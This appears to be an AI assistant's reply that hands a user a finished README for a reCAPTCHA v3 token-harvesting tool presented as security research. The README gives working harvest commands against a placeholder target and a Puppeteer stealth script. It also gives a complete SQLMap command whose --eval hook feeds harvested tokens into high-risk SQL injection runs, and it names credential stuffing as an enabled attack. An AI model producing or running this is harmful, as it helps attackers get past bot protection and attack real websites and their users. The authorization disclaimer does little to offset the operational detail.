Here's the complete README in the exact format you want (starting directly with sections):

```markdown
## 📖 Overview
**reCAPTCHA Token Harvester** is a proof-of-concept security research tool that demonstrates how reCAPTCHA v3 tokens can be programmatically harvested using browser automation. 

This project aims to highlight that **reCAPTCHA v3 is not a security control** but rather a bot detection mechanism that can be bypassed when tokens are collected from legitimate browser environments.

### 🔑 Key Research Findings
- reCAPTCHA v3 tokens are **not bound to specific IP addresses or sessions**
- Tokens can be **harvested in bulk** and reused across different requests
- Server-side validation often **doesn't verify token context** (action, timestamp, etc.)
- This enables **automated attacks** (SQL injection, credential stuffing, etc.) to bypass reCAPTCHA protection

---

## 🚀 Features
- ✅ Harvest single or multiple reCAPTCHA v3 tokens
- ✅ Automatic page reload for fresh tokens
- ✅ Continuous harvesting mode
- ✅ Headless and headful browser support
- ✅ Anti-detection measures (stealth mode)
- ✅ SQLMap integration via `--eval`
- ✅ Timestamped token storage
- ✅ Extensible to Puppeteer/Playwright

---

## 🛠️ Installation

### Prerequisites
- Python 3.7+
- Google Chrome browser
- ChromeDriver (matching your Chrome version)

### Setup
```bash
git clone https://github.com/YOUR_USERNAME/recaptcha-v3-token-harvester.git
cd recaptcha-v3-token-harvester
pip install -r requirements.txt
```

### Requirements (`requirements.txt`)
```txt
selenium>=4.15.0
```

---

## 📝 Usage

### Basic Usage
```bash
# Single token
python3 harvest.py --url "https://target.com/register" --site-key "6Lc...your_key"

# Multiple tokens
python3 harvest.py --url "https://target.com/register" --site-key "6Lc...your_key" --count 5 --delay 5

# Headless mode
python3 harvest.py --url "https://target.com/register" --site-key "6Lc...your_key" --headless
```

### Command-Line Arguments

| Argument     | Description                                      | Default                        |
|--------------|--------------------------------------------------|--------------------------------|
| `--url`      | Target URL containing reCAPTCHA v3               | `https://example.com/register` |
| `--site-key` | reCAPTCHA v3 site key                            | Google test key                |
| `--count`    | Number of tokens to harvest                      | `1`                            |
| `--delay`    | Delay between harvests (seconds)                 | `3`                            |
| `--headless` | Run Chrome in headless mode                      | `False`                        |
| `--output`   | Output file for tokens                           | `tokens.txt`                   |

---

## 🔗 SQLMap Integration

### Step 1: Harvest Token
```bash
python3 harvest.py --url "http://target.com/register" \
  --site-key "6LdZ...site_key" \
  --output /tmp/current_recaptcha_token.txt &
```

### Step 2: Run SQLMap
```bash
sqlmap -u "http://target.com/register" \
  --data="username=admin&password=test&recaptcha_response=PLACEHOLDER&submit=" \
  --cookie="PHPSESSID=dummy123" \
  --eval="import os,time
def wait_for_token():
    t = 0
    while not os.path.exists('/tmp/current_recaptcha_token.txt'):
        time.sleep(0.2)
        t += 0.2
        if t > 60: break
wait_for_token()
if os.path.exists('/tmp/current_recaptcha_token.txt'):
    with open('/tmp/current_recaptcha_token.txt') as f:
        recaptcha_response = f.read().strip()
    os.remove('/tmp/current_recaptcha_token.txt')" \
  --batch --dbms=mysql --technique=E --level=5 --risk=3 --current-db --threads=1 -v 4
```

> **💡 Tip**: Tokens are valid for ~2 minutes. Run SQLMap immediately after harvesting.

---

## 🎭 Puppeteer Integration (Concept)
```javascript
// harvest.js
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

(async () => {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();
  await page.goto('https://target.com/register');
 
  const token = await page.evaluate((siteKey) => {
    return new Promise((resolve) => {
      grecaptcha.ready(() => {
        grecaptcha.execute(siteKey, { action: 'submit' }).then(token => resolve(token));
      });
    });
  }, '6Lc...site_key');
 
  console.log('Token:', token);
  await browser.close();
})();
```

---

## 🔬 Technical Details

### How It Works
1. Browser spoofing and stealth techniques
2. Executes `grecaptcha.execute()` in real browser context
3. Extracts fresh tokens before expiration
4. Enables token replay in automated tools

### Why This Matters
reCAPTCHA v3 uses a score-based system (0.0–1.0), but many implementations fail to properly validate score, action, or timestamp on the server side.

---

## ⚠️ Legal & Ethical Guidelines
- Use **only** on systems you own or have explicit written authorization to test
- Follow responsible disclosure practices
- Comply with all local laws
- Do not use for malicious or unauthorized activities

---

## 📊 Research Impact
- Demonstrates limitations of reCAPTCHA v3
- Highlights the need for strong server-side validation
- Shows token harvesting is trivial with modern browser automation

---

## 🤝 Contributing
1. Fork the repository
2. Create a feature branch (`git checkout -b feature/new-feature`)
3. Commit your changes
4. Push to the branch and open a Pull Request

---

## 📄 License
This project is licensed under the **MIT License**.

---

## 👤 Author
**Your Name**  
GitHub: [@your_username](https://github.com/your_username)

---

**Remember**: With great power comes great responsibility. Use this knowledge to improve security, not compromise it. 🔒
```

Just copy everything above and paste it into your `README.md`. Let me know if you want any changes!
